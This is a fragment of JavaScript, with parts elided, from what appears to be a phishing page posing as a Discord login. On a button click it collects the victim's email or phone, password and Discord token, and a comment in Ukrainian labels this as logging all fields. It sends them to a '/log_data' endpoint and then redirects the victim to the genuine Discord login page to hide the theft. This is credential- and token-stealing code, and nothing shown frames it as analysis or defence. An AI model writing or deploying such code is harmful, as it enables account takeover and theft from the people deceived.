...
document.addEventListener("DOMContentLoaded", function () {
  ...
  tokenSubmit.addEventListener("click", function () {
      const email = document.getElementById("emailORphone")?.value || "Unknown";
      const password = document.getElementById("password")?.value || "Unknown";
      const token = document.getElementById("discord-token").value;

      if (token) {
          const userData = { email, password, token }; // Логування всіх полів
          ...
          fetch("/log_data", {
              ...
              if (response.ok) {
                  window.location.href = "https://discord.com/login"; // Перенаправлення
              }
